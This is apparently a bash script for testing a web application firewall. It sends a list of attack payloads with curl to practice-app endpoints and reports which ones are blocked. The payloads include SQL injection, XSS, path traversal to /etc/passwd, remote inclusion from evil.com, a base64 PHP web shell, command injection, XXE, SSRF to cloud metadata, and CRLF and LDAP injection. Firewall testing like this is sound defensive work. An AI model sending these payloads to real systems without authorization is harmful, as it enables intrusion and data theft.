#!/bin/bash

# ========================================
# WAF Attack Testing Script
# ========================================
# Tests various attack vectors against the WAF
# Use only in authorized testing environments

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
TARGET_URL="${1:-https://project.work.gd}"
OUTPUT_DIR="./waf/logs/test-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_FILE="$OUTPUT_DIR/test-report-$TIMESTAMP.txt"

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo "========================================" | tee -a "$REPORT_FILE"
echo "WAF Security Testing Report" | tee -a "$REPORT_FILE"
echo "Target: $TARGET_URL" | tee -a "$REPORT_FILE"
echo "Date: $(date)" | tee -a "$REPORT_FILE"
echo "========================================" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

# Counter for passed/failed tests
PASSED=0
FAILED=0
TOTAL=0

# Function to test attack pattern
test_attack() {
    local test_name="$1"
    local attack_payload="$2"
    local endpoint="${3:-/}"
    local method="${4:-GET}"
    
    TOTAL=$((TOTAL + 1))
    
    echo -e "${BLUE}Testing: $test_name${NC}"
    echo "Test #$TOTAL: $test_name" >> "$REPORT_FILE"
    echo "Payload: $attack_payload" >> "$REPORT_FILE"
    
    local response_code
    
    if [ "$method" == "GET" ]; then
        response_code=$(curl -k -s -o /dev/null -w "%{http_code}" \
            "${TARGET_URL}${endpoint}?input=${attack_payload}" \
            --max-time 10)
    else
        response_code=$(curl -k -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -d "input=${attack_payload}" \
            "${TARGET_URL}${endpoint}" \
            --max-time 10)
    fi
    
    # Check if attack was blocked (403 or 406)
    if [ "$response_code" == "403" ] || [ "$response_code" == "406" ]; then
        echo -e "${GREEN}✓ PASSED: Attack blocked (HTTP $response_code)${NC}"
        echo "Result: PASSED (HTTP $response_code)" >> "$REPORT_FILE"
        PASSED=$((PASSED + 1))
    else
        echo -e "${RED}✗ FAILED: Attack not blocked (HTTP $response_code)${NC}"
        echo "Result: FAILED (HTTP $response_code)" >> "$REPORT_FILE"
        FAILED=$((FAILED + 1))
    fi
    
    echo "" >> "$REPORT_FILE"
    echo ""
    sleep 1
}

# ========================================
# SQL Injection Tests
# ========================================

echo -e "${YELLOW}=== SQL Injection Tests ===${NC}"
echo "=== SQL Injection Tests ===" >> "$REPORT_FILE"

test_attack "SQLi: UNION SELECT" "' UNION SELECT NULL,NULL--" "/sqli_1.php"
test_attack "SQLi: Boolean-based blind" "' OR '1'='1" "/sqli_1.php"
test_attack "SQLi: Time-based blind" "'; WAITFOR DELAY '00:00:05'--" "/sqli_1.php"
test_attack "SQLi: Stacked queries" "'; DROP TABLE users--" "/sqli_1.php"
test_attack "SQLi: Comment injection" "admin'--" "/sqli_1.php"
test_attack "SQLi: Information schema" "' UNION SELECT table_name FROM information_schema.tables--" "/sqli_1.php"
test_attack "SQLi: Authentication bypass" "admin' OR 1=1--" "/sqli_1.php"
test_attack "SQLi: Hex encoding" "0x61646d696e" "/sqli_1.php"

# ========================================
# Cross-Site Scripting (XSS) Tests
# ========================================

echo -e "${YELLOW}=== XSS Tests ===${NC}"
echo "=== XSS Tests ===" >> "$REPORT_FILE"

test_attack "XSS: Basic script tag" "<script>alert(1)</script>" "/xss_reflected.php"
test_attack "XSS: Event handler" "<img src=x onerror=alert(1)>" "/xss_reflected.php"
test_attack "XSS: JavaScript protocol" "<a href=\"javascript:alert(1)\">Click</a>" "/xss_reflected.php"
test_attack "XSS: iframe injection" "<iframe src=\"javascript:alert(1)\"></iframe>" "/xss_reflected.php"
test_attack "XSS: SVG-based" "<svg onload=alert(1)>" "/xss_reflected.php"
test_attack "XSS: Data URI" "<object data=\"data:text/html,<script>alert(1)</script>\">" "/xss_reflected.php"
test_attack "XSS: DOM manipulation" "<img src=x onerror=\"document.write('hacked')\">" "/xss_reflected.php"
test_attack "XSS: HTML entity encoding" "&#60;script&#62;alert(1)&#60;/script&#62;" "/xss_reflected.php"
test_attack "XSS: AngularJS template" "{{constructor.constructor('alert(1)')()}}" "/xss_reflected.php"

# ========================================
# Local File Inclusion (LFI) Tests
# ========================================

echo -e "${YELLOW}=== LFI Tests ===${NC}"
echo "=== LFI Tests ===" >> "$REPORT_FILE"

test_attack "LFI: Directory traversal" "../../../../etc/passwd" "/rlfi.php"
test_attack "LFI: Null byte injection" "../../../../etc/passwd%00" "/rlfi.php"
test_attack "LFI: URL encoded traversal" "..%2F..%2F..%2Fetc%2Fpasswd" "/rlfi.php"
test_attack "LFI: Windows path" "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" "/rlfi.php"
test_attack "LFI: /proc/self access" "/proc/self/environ" "/rlfi.php"

# ========================================
# Remote File Inclusion (RFI) Tests
# ========================================

echo -e "${YELLOW}=== RFI Tests ===${NC}"
echo "=== RFI Tests ===" >> "$REPORT_FILE"

test_attack "RFI: HTTP inclusion" "http://evil.com/shell.php" "/rlfi.php"
test_attack "RFI: PHP wrapper" "php://input" "/rlfi.php"
test_attack "RFI: Data wrapper" "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=" "/rlfi.php"
test_attack "RFI: Expect wrapper" "expect://whoami" "/rlfi.php"

# ========================================
# Remote Code Execution (RCE) Tests
# ========================================

echo -e "${YELLOW}=== RCE Tests ===${NC}"
echo "=== RCE Tests ===" >> "$REPORT_FILE"

test_attack "RCE: Shell command" "| whoami" "/commandi.php"
test_attack "RCE: Command substitution" "\$(whoami)" "/commandi.php"
test_attack "RCE: Backtick execution" "\`whoami\`" "/commandi.php"
test_attack "RCE: PHP system function" "system('whoami')" "/phpi.php"
test_attack "RCE: Semicolon separator" "; ls -la" "/commandi.php"

# ========================================
# XML External Entity (XXE) Tests
# ========================================

echo -e "${YELLOW}=== XXE Tests ===${NC}"
echo "=== XXE Tests ===" >> "$REPORT_FILE"

test_attack "XXE: External entity" "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" "/xxe_1.php" "POST"
test_attack "XXE: Parameter entity" "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe\">%xxe;]>" "/xxe_1.php" "POST"

# ========================================
# Server-Side Request Forgery (SSRF) Tests
# ========================================

echo -e "${YELLOW}=== SSRF Tests ===${NC}"
echo "=== SSRF Tests ===" >> "$REPORT_FILE"

test_attack "SSRF: Internal IP" "http://127.0.0.1" "/ssrf.php"
test_attack "SSRF: Private network" "http://192.168.1.1" "/ssrf.php"
test_attack "SSRF: Cloud metadata" "http://169.254.169.254/latest/meta-data/" "/ssrf.php"
test_attack "SSRF: Localhost" "http://localhost" "/ssrf.php"

# ========================================
# HTTP Response Splitting Tests
# ========================================

echo -e "${YELLOW}=== Response Splitting Tests ===${NC}"
echo "=== Response Splitting Tests ===" >> "$REPORT_FILE"

test_attack "Response Splitting: CRLF injection" "test%0d%0aSet-Cookie:admin=true" "/htmli_get.php"
test_attack "Response Splitting: Header injection" "test\r\nX-Injected:true" "/htmli_get.php"

# ========================================
# LDAP Injection Tests
# ========================================

echo -e "${YELLOW}=== LDAP Injection Tests ===${NC}"
echo "=== LDAP Injection Tests ===" >> "$REPORT_FILE"

test_attack "LDAP: Filter injection" "*)(uid=*))(|(uid=*" "/ldapi.php"
test_attack "LDAP: Bypass authentication" "admin)(&(password=*)" "/ldapi.php"

# ========================================
# Generate Summary Report
# ========================================

echo "" | tee -a "$REPORT_FILE"
echo "========================================" | tee -a "$REPORT_FILE"
echo "Test Summary" | tee -a "$REPORT_FILE"
echo "========================================" | tee -a "$REPORT_FILE"
echo "Total Tests: $TOTAL" | tee -a "$REPORT_FILE"
echo -e "${GREEN}Passed (Blocked): $PASSED${NC}" | tee -a "$REPORT_FILE"
echo -e "${RED}Failed (Not Blocked): $FAILED${NC}" | tee -a "$REPORT_FILE"

PASS_RATE=$((PASSED * 100 / TOTAL))
echo "Success Rate: $PASS_RATE%" | tee -a "$REPORT_FILE"
echo "" | tee -a "$REPORT_FILE"

if [ $PASS_RATE -ge 90 ]; then
    echo -e "${GREEN}✓ WAF PROTECTION: EXCELLENT${NC}" | tee -a "$REPORT_FILE"
elif [ $PASS_RATE -ge 75 ]; then
    echo -e "${YELLOW}⚠ WAF PROTECTION: GOOD${NC}" | tee -a "$REPORT_FILE"
elif [ $PASS_RATE -ge 50 ]; then
    echo -e "${YELLOW}⚠ WAF PROTECTION: MODERATE${NC}" | tee -a "$REPORT_FILE"
else
    echo -e "${RED}✗ WAF PROTECTION: WEAK${NC}" | tee -a "$REPORT_FILE"
fi

echo "" | tee -a "$REPORT_FILE"
echo "Full report saved to: $REPORT_FILE" | tee -a "$REPORT_FILE"
echo "Check WAF logs at: ./waf/logs/" | tee -a "$REPORT_FILE"
echo ""

exit 0
